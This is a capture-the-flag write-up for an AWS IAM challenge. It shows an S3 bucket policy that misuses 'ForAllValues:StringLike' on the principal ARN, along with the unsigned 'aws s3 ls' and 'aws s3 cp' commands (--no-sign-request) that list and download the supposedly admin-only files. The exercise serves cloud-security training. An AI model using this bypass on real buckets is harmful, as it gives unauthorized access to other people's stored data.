---
tags:
  - IAM
  - S3
title: THE BIG IAM Challenge - Admin Only
description: ForAllValues:StringLike may not be what you think
reference: https://thebigiamchallenge.com/challenge/4
---
## Challenge

We learned from our mistakes from the past. Now our bucket only allows access to one specific admin user. Or does it?

## Solution

### 1. View the provided IAM Policy

`ForAllValues:StringLike`??

```json
{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Principal": "*", "Action": "s3:GetObject", "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*" }, { "Effect": "Allow", "Principal": "*", "Action": "s3:ListBucket", "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321", "Condition": { "StringLike": { "s3:prefix": "files/*" }, "ForAllValues:StringLike": { "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin" } } } ] }
```


### 2. use `aws s3 cli` randomly since I have no idea

Somehow `--no-sign-request` can "break" the IAM policy.


```
> aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request

2023-06-07 19:15:43         42 flag-as-admin.txt

2023-06-08 19:20:01      81889 logo-admin.png
> aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt /tmp/flag.txt --no-sign-request

Completed 42 Bytes/42 Bytes (546 Bytes/s) with 1 file(s) remainingdownload: s3://thebigiamchallenge-admin-storage-abf1321/files/flag-

as-admin.txt to ../../tmp/flag.txt

> cat /tmp/flag.txt

{wiz:principal-arn-is-not-what-you-think}
```

### Why `--no-sign-request` works?

1. The flag `--no-sgn-requets` means "Do not sign requests. Credentials will not be loaded if this argument is provided."
2.  `ForAllValues` – This qualifier tests whether the value of every member of the request set is a subset of the condition context key set. The condition returns `true` if every context key value in the request matches at least one context key value in the policy. It also returns `true` if there are **no context keys in the request** or if the context key value resolves to a null dataset, such as an empty string.
3. The IAM policy for authorizting S3 `/files`'s **List** permission condition is `"ForAllValues:StringLike": { "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin" }`
